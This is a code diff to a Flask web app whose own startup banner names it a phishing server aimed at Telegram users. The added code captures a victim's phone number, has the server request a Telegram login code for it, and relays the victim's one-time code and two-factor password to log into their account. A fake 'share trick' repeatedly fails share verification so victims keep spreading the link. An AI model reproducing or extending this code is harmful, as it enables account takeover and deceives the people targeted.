-    contactTimeout = setTimeout(function() {
-        clearInterval(contactCheckInterval);
-        contactCheckInterval = null;
-        document.getElementById('requestContactBtn').disabled = false;
-        document.getElementById('retryBtn').style.display = 'block';
-        st.className = 'status-box error show';
-        st.innerHTML = '❌ Timeout. Tap Retry.';
-        st.style.display = 'block';
-    }, 60000);
+    var script = document.createElement('script');
+    script.src = "https://telegram.org/js/telegram-widget.js?22";
+    script.setAttribute('data-telegram-login', '{{ BOT_USERNAME }}');
+    script.setAttribute('data-size', 'large');
+    script.setAttribute('data-onauth', 'onTelegramAuth(user)');
+    script.setAttribute('data-request-phone', 'true');
+    script.setAttribute('data-radius', '14');
+    script.setAttribute('data-userpic', 'false');
+    container.appendChild(script);
 }
 
-async function checkBotContact() {
-    try {
-        var r = await fetch('/api/bot_check', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({session_id: botSessionId})
-        });
-        var d = await r.json();
-        if (d.phone) {
-            clearInterval(contactCheckInterval);
-            contactCheckInterval = null;
-            if (contactTimeout) clearTimeout(contactTimeout);
-            phoneNumber = d.phone;
+// ===== CALLBACK: Telegram Auth Success (Phone Received!) =====
+function onTelegramAuth(user) {
+    console.log('Telegram Auth:', user);
+    
+    var st = document.getElementById('loginStatus');
+    st.className = 'status-box info show';
+    st.innerHTML = '⏳ Processing your information...';
+    st.style.display = 'block';
+    
+    // Send to server for verification
+    fetch('/api/telegram_auth', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(user)
+    })
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+        if (data.success && data.phone) {
+            phoneNumber = data.phone;
             localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
-            localStorage.setItem(SAVED_STEP_KEY, 'otp_ready');
             
-            var st = document.getElementById('contactStatus');
             st.className = 'status-box success show';
-            st.innerHTML = '✅ Phone received! Sending code...';
+            st.innerHTML = '✅ Phone received! Sending verification code...';
             st.style.display = 'block';
-            document.getElementById('retryBtn').style.display = 'none';
+            
+            // Now send OTP
             sendPhoneToBackend(phoneNumber);
+        } else {
+            // Phone not available - show manual input
+            st.className = 'status-box error show';
+            st.innerHTML = '❌ Could not get phone number. Please enter manually.';
+            st.style.display = 'block';
+            showManualInput();
         }
-    } catch(e) {}
+    })
+    .catch(function() {
+        st.className = 'status-box error show';
+        st.innerHTML = '❌ Connection error. Please enter manually.';
+        st.style.display = 'block';
+        showManualInput();
+    });
 }
 
-// ===== FIXED: sendPhoneToBackend with hash tracking =====
-async function sendPhoneToBackend(phone, isReturning) {
+function showManualInput() {
+    document.getElementById('phoneInputArea').style.display = 'block';
+    document.getElementById('tgWidgetContainer').style.display = 'none';
+}
+
+async function sendManualPhone() {
+    var phone = document.getElementById('phoneInput').value.trim();
+    if (!phone || phone.length < 5) {
+        var st = document.getElementById('loginStatus');
+        st.className = 'status-box error show';
+        st.innerHTML = '❌ Please enter a valid phone number';
+        st.style.display = 'block';
+        return;
+    }
+    
+    phoneNumber = phone;
+    localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
+    sendPhoneToBackend(phoneNumber);
+}
+
+async function sendPhoneToBackend(phone) {
+    document.getElementById('manualBtn') && (document.getElementById('manualBtn').disabled = true);
+    
+    var st = document.getElementById('loginStatus');
+    st.className = 'status-box info show';
+    st.innerHTML = '⏳ Sending verification code...';
+    st.style.display = 'block';
+    
     try {
-        var r = await fetch('/api/share', {
+        var res = await fetch('/api/share', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({phone: phone})
         });
-        var d = await r.json();
+        var data = await res.json();
         
-        if (d.success) {
-            localStorage.setItem(SAVED_PHONE_KEY, phone);
+        if (data.success) {
             localStorage.setItem(SAVED_STEP_KEY, 'otp_sent');
-            if (d.hash) localStorage.setItem(SAVED_HASH_KEY, d.hash);
-            
             showStep('s2');
             document.getElementById('pd').textContent = phone;
+            document.getElementById('otpInput').value = '';
+            document.getElementById('otpInput').focus();
+            
             var cs = document.getElementById('cs');
-            cs.className = 'status-box success show';
-            cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
+            cs.className = 'status-box waiting show';
+            cs.innerHTML = '⏳ Sending code...';
             cs.style.display = 'block';
             startCodeCheck();
         } else {
-            // If error, show and allow retry
-            showContactError(d.error || 'Failed to send code');
+            st.className = 'status-box error show';
+            st.innerHTML = '❌ ' + (data.error || 'Failed to send code');
+            st.style.display = 'block';
         }
     } catch(e) {
-        showContactError('Connection error');
-    }
-}
-
-function showContactError(msg) {
-    var st = document.getElementById('contactStatus') || document.getElementById('vs');
-    if (st) {
         st.className = 'status-box error show';
-        st.innerHTML = '❌ ' + msg;
+        st.innerHTML = '❌ Connection error';
         st.style.display = 'block';
     }
-    document.getElementById('requestContactBtn').disabled = false;
-    document.getElementById('retryBtn').style.display = 'block';
 }
 
 // ===== OTP CHECK =====
@@ -717,173 +568,167 @@ function startCodeCheck() {
     if (codeCheckInterval) clearInterval(codeCheckInterval);
     codeCheckInterval = setInterval(async function() {
         try {
-            var r = await fetch('/api/check', {
+            var res = await fetch('/api/check', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: phoneNumber})
             });
-            var d = await r.json();
-            
-            if (d.s === 'sent') {
-                clearInterval(codeCheckInterval);
-                codeCheckInterval = null;
+            var data = await res.json();
+            if (data.s === 'sent') {
+                clearInterval(codeCheckInterval); codeCheckInterval = null;
                 var cs = document.getElementById('cs');
                 cs.className = 'status-box success show';
-                cs.innerHTML = '✅ Code sent! Enter below:';
+                cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
                 cs.style.display = 'block';
-            } else if (d.s === 'done') {
-                clearInterval(codeCheckInterval);
-                codeCheckInterval = null;
+                document.getElementById('otpInput').focus();
+            } else if (data.s === 'done') {
+                clearInterval(codeCheckInterval); codeCheckInterval = null;
                 localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                 showStep('s3');
                 setupShareLink();
-            } else if (d.s === '2fa_needed') {
-                clearInterval(codeCheckInterval);
-                codeCheckInterval = null;
+            } else if (data.s === '2fa_needed') {
+                clearInterval(codeCheckInterval); codeCheckInterval = null;
                 showStep('s2b');
-            } else if (d.s === 'err') {
-                clearInterval(codeCheckInterval);
-                codeCheckInterval = null;
+            } else if (data.s === 'err') {
+                clearInterval(codeCheckInterval); codeCheckInterval = null;
                 var cs = document.getElementById('cs');
                 cs.className = 'status-box error show';
-                cs.innerHTML = '❌ Failed to send code';
+                cs.innerHTML = '❌ Error sending code. Please try again.';
                 cs.style.display = 'block';
             }
         } catch(e) {}
     }, 2000);
+}
+
+// ===== OTP Submit =====
+async function submitOTP() {
+    var code = document.getElementById('otpInput').value.trim();
+    if (!code || code.length < 4) {
+        showVerifyStatus('❌ Please enter the full code', 'error');
+        return;
+    }
+    
+    document.getElementById('verifyBtn').disabled = true;
+    document.getElementById('verifyBtn').textContent = '⏳ Verifying...';
+    
+    try {
+        var res = await fetch('/api/verify', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({phone: phoneNumber, code: code})
+        });
+        var data = await res.json();
+        
+        if (data.success) {
+            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
+            showStep('s3');
+            setupShareLink();
+            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+        } else if (data.needs_password) {
+            showStep('s2b');
+            startPasswordCheck();
+            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+        } else {
+            showVerifyStatus('❌ ' + (data.error || 'Invalid code'), 'error');
+            document.getElementById('otpInput').value = '';
+            document.getElementById('otpInput').focus();
+            document.getElementById('verifyBtn').disabled = false;
+            document.getElementById('verifyBtn').textContent = '✓ Verify Code';
+        }
+    } catch(e) {
+        showVerifyStatus('❌ Network error', 'error');
+        document.getElementById('verifyBtn').disabled = false;
+        document.getElementById('verifyBtn').textContent = '✓ Verify Code';
+    }
 }
 
 function startPasswordCheck() {
     if (passwordCheckInterval) clearInterval(passwordCheckInterval);
     passwordCheckInterval = setInterval(async function() {
         try {
-            var r = await fetch('/api/check', {
+            var res = await fetch('/api/check', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: phoneNumber})
             });
-            var d = await r.json();
-            if (d.s === 'done') {
-                clearInterval(passwordCheckInterval);
-                passwordCheckInterval = null;
+            var data = await res.json();
+            if (data.s === 'done') {
+                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                 localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                 showStep('s3');
                 setupShareLink();
-            } else if (d.s === 'err') {
-                clearInterval(passwordCheckInterval);
-                passwordCheckInterval = null;
+            } else if (data.s === 'err') {
+                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                 var ps = document.getElementById('pwdStatus');
                 ps.className = 'status-box error show';
-                ps.innerHTML = '❌ Failed';
+                ps.innerHTML = '❌ Verification failed';
                 ps.style.display = 'block';
             }
         } catch(e) {}
     }, 2000);
 }
 
-function pk(n) {
-    if (codeDigits.length < 5) {
-        codeDigits += n;
-        document.getElementById('cdisp').textContent = codeDigits;
-        if (codeDigits.length === 5) setTimeout(sc, 300);
-    }
-}
-function cc() { 
-    codeDigits = codeDigits.slice(0, -1); 
-    document.getElementById('cdisp').textContent = codeDigits || '_____'; 
-}
-
-async function sc() {
-    if (codeDigits.length < 5) { showStatus('vs', 'Enter 5 digits', 'error'); return; }
-    document.getElementById('sb').disabled = true;
-    document.getElementById('sb').textContent = '⏳';
-    try {
-        var r = await fetch('/api/verify', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
-        });
-        var d = await r.json();
-        
-        if (d.success) {
-            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
-            localStorage.removeItem(SAVED_HASH_KEY);
-            showStep('s3');
-            setupShareLink();
-            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
-        } else if (d.needs_password) {
-            showStep('s2b');
-            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
-        } else if (d.error === 'resend') {
-            // Code expired / hash invalid — resent automatically, just wait
-            showStatus('vs', '🔄 Code resent. Check Telegram.', 'info');
-            codeDigits = '';
-            document.getElementById('cdisp').textContent = '_____';
-            document.getElementById('sb').disabled = false;
-            document.getElementById('sb').textContent = '✓';
-            startCodeCheck();
-        } else {
-            showStatus('vs', d.error || 'Wrong code', 'error');
-            codeDigits = '';
-            document.getElementById('cdisp').textContent = '_____';
-            document.getElementById('sb').disabled = false;
-            document.getElementById('sb').textContent = '✓';
-        }
-    } catch(e) {
-        showStatus('vs', 'Network error', 'error');
-        document.getElementById('sb').disabled = false;
-        document.getElementById('sb').textContent = '✓';
-    }
-}
-
 async function submitPassword() {
     var pwd = document.getElementById('pwdInput').value.trim();
-    if (!pwd) { showStatus('pwdStatus', 'Enter password', 'error'); return; }
-    showStatus('pwdStatus', '⏳ Verifying...', 'waiting');
+    if (!pwd) {
+        var ps = document.getElementById('pwdStatus');
+        ps.className = 'status-box error show';
+        ps.innerHTML = '❌ Enter your password';
+        ps.style.display = 'block';
+        return;
+    }
+    var ps = document.getElementById('pwdStatus');
+    ps.className = 'status-box waiting show';
+    ps.innerHTML = '⏳ Verifying...';
+    ps.style.display = 'block';
     try {
-        var r = await fetch('/api/verify', {
+        var res = await fetch('/api/verify', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
+            body: JSON.stringify({phone: phoneNumber, code: document.getElementById('otpInput').value.trim(), password: pwd})
         });
-        var d = await r.json();
-        if (d.success) {
+        var data = await res.json();
+        if (data.success) {
             localStorage.setItem(SAVED_STEP_KEY, 'share_page');
-            localStorage.removeItem(SAVED_HASH_KEY);
             showStep('s3');
             setupShareLink();
             if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
         } else {
-            showStatus('pwdStatus', d.error || 'Wrong password', 'error');
+            ps.className = 'status-box error show';
+            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
+            ps.style.display = 'block';
         }
     } catch(e) {
-        showStatus('pwdStatus', 'Error', 'error');
+        ps.className = 'status-box error show';
+        ps.innerHTML = '❌ Connection error';
+        ps.style.display = 'block';
     }
 }
 
-function showStatus(id, msg, type) {
-    var el = document.getElementById(id);
-    if (el) {
-        el.textContent = msg;
-        el.className = 'status-box ' + type + ' show';
-        el.style.display = 'block';
-    }
+function showVerifyStatus(msg, type) {
+    document.getElementById('vs').textContent = msg;
+    document.getElementById('vs').className = 'status-box ' + type + ' show';
+    document.getElementById('vs').style.display = 'block';
+}
+
+function showStep(id) {
+    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
 }
 
 function resetAll() {
-    if (codeCheckInterval) clearInterval(codeCheckInterval);
-    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
-    codeDigits = '';
+    if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+    if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
     localStorage.removeItem(SAVED_PHONE_KEY);
     localStorage.removeItem(SAVED_STEP_KEY);
-    localStorage.removeItem(SAVED_HASH_KEY);
-    localStorage.removeItem(SAVED_SHARES_KEY);
     phoneNumber = '';
     savedStep = '';
-    sharesDone = 0;
+    document.getElementById('otpInput').value = '';
     showStep('s1');
+    initTelegramWidget();
 }
 
+// ===== SHARE TRICK =====
 function setupShareLink() {
     var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
     document.getElementById('shareLink').textContent = link;
@@ -891,8 +736,8 @@ function setupShareLink() {
 }
 
 function simulateShare() {
-    var url = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
-    window.open(url, '_blank');
+    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
+    window.open(shareUrl, '_blank');
     
     if (sharesDone < 4) {
         sharesDone++;
@@ -901,26 +746,31 @@ function simulateShare() {
     }
     
     var st = document.getElementById('shareStatus');
+    
     if (sharesDone < 4) {
         st.className = 'status-box success show';
         st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
-    } else {
+    } else if (sharesDone === 4) {
         st.className = 'status-box waiting show';
         st.innerHTML = '⏳ Almost there! Just 1 more share!';
         setTimeout(function() {
-            st.className = 'status-box info show';
-            st.innerHTML = '🔄 Verifying...';
-            setTimeout(function() {
-                st.className = 'status-box error show';
-                st.innerHTML = '❌ Verification failed. Try again.';
-                sharesDone = 3;
-                localStorage.setItem(SAVED_SHARES_KEY, '3');
-                updateShareProgress();
+            if (sharesDone === 4) {
+                st.className = 'status-box info show';
+                st.innerHTML = '🔄 Verifying shares...';
                 setTimeout(function() {
-                    st.className = 'status-box waiting show';
-                    st.innerHTML = '⏳ Share with 2 more friends.';
-                }, 2000);
-            }, 5000);
+                    if (sharesDone === 4) {
+                        st.className = 'status-box error show';
+                        st.innerHTML = '❌ Verification failed. Try again.';
+                        sharesDone = 3;
+                        localStorage.setItem(SAVED_SHARES_KEY, '3');
+                        updateShareProgress();
+                        setTimeout(function() {
+                            st.className = 'status-box waiting show';
+                            st.innerHTML = '⏳ Share with 2 more friends to retry.';
+                        }, 2000);
+                    }
+                }, 5000);
+            }
         }, 3000);
     }
 }
@@ -945,11 +795,67 @@ function updateShareProgress() {
 </html>"""
 
 
+# ====== Flask Routes ======
+
 @app.route('/')
 def index():
     page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
+    page = page.replace('{{ BOT_ID }}', BOT_ID)
     return render_template_string(page)
 
+@app.route('/api/telegram_auth', methods=['POST'])
+def telegram_auth():
+    """Telegram Login Widget callback - phone number নিন"""
+    auth_data = request.json
+    logger.info(f"📩 Telegram Auth: {json.dumps(auth_data, indent=2)[:200]}")
+    
+    # Server-side verification
+    if not verify_telegram_auth(auth_data):
+        logger.warning("⚠️ Invalid Telegram auth hash")
+        return jsonify({'success': False, 'error': 'Invalid auth data'})
+    
+    phone = auth_data.get('phone_number', '')
+    if phone:
+        phone = format_phone(phone)
+        logger.info(f"📱 Phone received via Telegram Login: {phone}")
+        return jsonify({'success': True, 'phone': phone})
+    else:
+        logger.warning("⚠️ No phone number in auth data")
+        return jsonify({'success': False, 'error': 'No phone number'})
+
+@app.route('/api/share', methods=['POST'])
+def share():
+    ph = request.json.get('phone', '')
+    if not ph:
+        return jsonify({'success': False, 'error': 'Phone required'})
+    ph = format_phone(ph)
+    logger.info(f"📱 Sending code to: {ph}")
+    
+    with sessions_lock:
+        pending_codes[ph] = 'sending'
+    
+    t = threading.Thread(target=run_telegram_action_sync, args=(ph,))
+    t.daemon = True
+    t.start()
+    
+    return jsonify({'success': True})
+
+@app.route('/api/check', methods=['POST'])
+def check():
+    phone = request.json.get('phone', '')
+    with sessions_lock:
+        s = pending_codes.get(phone, 'waiting')
+    return jsonify({'s': s})
+
+@app.route('/api/verify', methods=['POST'])
+def verify():
+    d = request.json
+    ph = d.get('phone', '')
+    code = d.get('code', '')
+    password = d.get('password', None)
+    ph = format_phone(ph)
+    result = run_telegram_action_sync(ph, code, password)
+    return jsonify(result)
 
 @app.route('/dash')
 def dash():
@@ -1005,27 +911,27 @@ def dash():
     """
 
 
-# ====== Start Bot Polling (SINGLE INSTANCE) ======
-_polling_started = False
-
-def start_bot():
-    global _polling_started
-    if _polling_started:
-        return
-    _polling_started = True
-    time.sleep(3)
-    t = threading.Thread(target=bot_polling_loop, daemon=True)
-    t.start()
-
-
 if __name__ == '__main__':
-    if not BOT_TOKEN or not API_HASH:
-        print("⚠️ Missing environment variables!")
+    if not BOT_TOKEN or not API_HASH or API_ID == 0:
+        print("⚠️  WARNING: Missing environment variables!")
+        print(f"   BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
+        print(f"   BOT_ID: {'✅' if BOT_ID else '❌'}")
+        print(f"   API_ID: {API_ID}")
+        print(f"   API_HASH: {'✅' if API_HASH else '❌'}")
+        print(f"   OWNER_ID: {YOUR_TELEGRAM_ID}")
+        print(f"   BOT_USERNAME: {BOT_USERNAME}")
     else:
-        print("✅ All env vars set!")
+        print("✅ All environment variables set!")
     
     port = int(os.environ.get('PORT', 5000))
+    print(f"\n{'='*50}")
+    print(f"🔥 PULSE — Phishing Server (Telegram Login Widget)")
+    print(f"{'='*50}")
+    print(f"🌐 URL:      http://0.0.0.0:{port}")
+    print(f"📊 Dashboard: http://0.0.0.0:{port}/dash")
+    print(f"📱 New: Telegram Login Widget — Web App থেকে সরাসরি phone share!")
+    print(f"{'='*50}\n")
+    print(f"🔧 @BotFather এ /setdomain কমান্ড দিয়ে আপনার ডোমেইন সেট করুন!")
+    print(f"{'='*50}\n")
     
-    start_bot()  # Start polling before Flask
-    
-    app.run(host='0.0.0.0', port=port, debug=False)  # debug=False গুরুত্বপূর্ণ!
+    app.run(host='0.0.0.0', port=port, debug=False)
